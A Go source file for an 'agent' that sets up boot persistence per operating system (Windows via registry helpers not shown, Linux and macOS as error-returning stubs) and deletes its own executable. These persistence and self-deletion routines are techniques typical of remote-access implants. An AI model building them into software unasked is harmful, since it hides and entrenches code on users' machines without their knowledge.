package persistence

import (
	"fmt"
	"os"
	"runtime"
)

// Manager handles persistence configuration
type Manager struct {
	isEnabled bool
}

// New creates a new persistence manager
func New() *Manager {
	return &Manager{}
}

// IsEnabled returns current persistence status
func (m *Manager) IsEnabled() bool {
	return m.isEnabled
}

// Enable sets up auto-start on boot
func (m *Manager) Enable(agentPath string) error {
	switch runtime.GOOS {
	case "windows":
		return m.enableWindows(agentPath)
	case "linux":
		return m.enableLinux(agentPath)
	case "darwin":
		return m.enableDarwin(agentPath)
	default:
		return fmt.Errorf("persistence not supported on %s", runtime.GOOS)
	}
}

// Disable removes auto-start configuration
func (m *Manager) Disable() error {
	switch runtime.GOOS {
	case "windows":
		return m.disableWindows()
	case "linux":
		return m.disableLinux()
	case "darwin":
		return m.disableDarwin()
	default:
		return fmt.Errorf("persistence not supported on %s", runtime.GOOS)
	}
}

// SelfDelete schedules the agent executable for deletion.
// On Windows, this uses MoveFileExW with MOVEFILE_DELAY_UNTIL_REBOOT
// since a running process cannot delete its own file directly.
// On other platforms, os.Remove is attempted immediately.
func SelfDelete() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	selfDeletePlatform(exePath)
}

// Windows implementation — delegates to persistence_windows.go
func (m *Manager) enableWindows(agentPath string) error {
	if err := enableWindowsRegistry(agentPath); err != nil {
		return err
	}
	m.isEnabled = true
	return nil
}

func (m *Manager) disableWindows() error {
	if err := disableWindowsRegistry(); err != nil {
		return err
	}
	m.isEnabled = false
	return nil
}

// Linux implementation
func (m *Manager) enableLinux(agentPath string) error {
	m.isEnabled = true
	return fmt.Errorf("linux persistence: requires systemd service setup")
}

func (m *Manager) disableLinux() error {
	m.isEnabled = false
	return nil
}

// Darwin (macOS) implementation
func (m *Manager) enableDarwin(agentPath string) error {
	// LaunchAgent plist
	m.isEnabled = true
	return fmt.Errorf("macos persistence: requires LaunchAgent plist")
}

func (m *Manager) disableDarwin() error {
	m.isEnabled = false
	return nil
}

// GetExecutablePath returns the current executable path
func GetExecutablePath() (string, error) {
	return os.Executable()
}
